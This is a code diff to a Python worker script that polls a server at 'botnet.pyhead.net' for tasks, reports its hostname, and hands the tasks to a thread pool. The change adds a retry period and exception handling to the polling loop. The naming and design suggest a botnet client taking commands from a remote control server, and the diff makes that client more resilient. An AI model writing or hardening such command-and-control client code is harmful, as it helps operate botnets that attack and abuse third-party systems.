@@ -26,6 +26,7 @@ url = f"https://botnet.pyhead.net/api/v2/tasks/json/?hostname={gethostname()};cp
 logger.info(f"The task {url=}")
 
 loop_time = 120
+RETRY_PERIOD_SEC = 30
 
 
 class Worker(Thread):
@@ -133,21 +134,23 @@ if __name__ == '__main__':
         while True:
 
             logger.info("Getting fresh tasks from the server!")
+            try:
+                for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
+                    while int(psutil.cpu_percent()) > 70:
+                        logger.critical(
+                            "The CPU loag is to high. Thread waiting...")
+                        logger.info(
+                            f"Queue size: {pool.tasks.qsize()}, Next task {conf.Dst}")
 
-            for conf in json.loads(urlopen(url).read(), object_hook=customDecoder):
+                    pool.add_task(runner, conf)
 
-                while int(psutil.cpu_percent()) > 70:
-                    logger.critical(
-                        "The CPU loag is to high. Thread waiting...")
-                    logger.info(
-                        f"Queue size: {pool.tasks.qsize()}, Next task {conf.Dst}")
-
-                pool.add_task(runner, conf)
-
-                logger.info(f"The system works good! Thanks :P ")
-                sleep(5)
-
-            pool.wait_completion()
+                    logger.info(f"The system works good! Thanks :P ")
+                    sleep(5)
+                pool.wait_completion()
+            except Exception as error:
+                logger.critical(f"OOPS... We faced an issue: %s", error)
+                logger.info(f"Retrying in %ds", RETRY_PERIOD_SEC)
+                sleep(RETRY_PERIOD_SEC)
 
     except KeyboardInterrupt:
         logger.info("Shutting down... Ctrl + C")
